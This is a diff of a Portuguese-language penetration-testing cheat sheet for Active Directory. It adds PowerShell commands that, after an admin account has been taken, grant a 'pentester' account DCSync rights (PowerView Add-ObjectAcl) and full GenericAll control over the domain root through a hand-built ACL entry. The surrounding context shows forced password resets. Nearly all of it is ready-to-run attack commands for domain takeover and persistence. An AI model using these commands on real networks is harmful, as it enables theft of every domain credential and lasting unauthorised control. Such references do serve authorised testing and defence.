@@ -1660,9 +1660,22 @@ Set-ADAccountPassword -Identity goku -Reset -NewPassword $MyPassword
 ```
 Set-ADAccountPassword -Identity goku -Reset -NewPassword (ConvertTo-SecureString -AsPlainText -Force -String aaabbbccc) -Verbose
 ```
-##### ADMIN SDHOLDER - DEPOIS DE PEGAR UMA CONTA DE ADMIN, ABUSAR DE PERMISSÃO PARA CONFIGURAR PERMISSÃO PARA DCSYNC
+##### ADMIN SDHOLDER - DEPOIS DE PEGAR UMA CONTA DE ADMIN, ABUSAR DE PERMISSÃO PARA CONFIGURAR PERMISSÃO PARA DCSYNC (POWERVIEW)
 ```
 Add-ObjectAcl -TargetIdentity 'DC=TECH,DC=LOCAL' -PrincipalIdentity pentester -Rights DCSync -Verbose
+```
+##### ADMIN SDHOLDER - DEPOIS DE PEGAR UMA CONTA DE ADMIN, ABUSAR DE PERMISSÃO PARA CONFIGURAR PERMISSÃO FULL PARA DOMINIO (DCSYNC)
+```
+ $MyAdmin = (get-aduser pentester).sid
+$MyDistinguishedName = "DC=TECH,DC=LOCAL"
+$MyDistinguishedNameAD = $MyDistinguishedName = "AD:$MyDistinguishedName"
+$MyACL= Get-ACL $MyDistinguishedNameAD
+$MyADRights = [System.DirectoryServices.ActiveDirectoryRights] "Genericall"
+$MyType = [System.Security.AccessControl.AccessControlType] "Allow"
+$MyInheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] "All"
+$MyACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $MyAdmin,$MyADRights,$MyType,$MyInheritanceType
+$MyACL.AddAccessRule($MyACE)
+Set-acl -aclobject $MyACL $MyDistinguishedNameAD
 ```
 
 
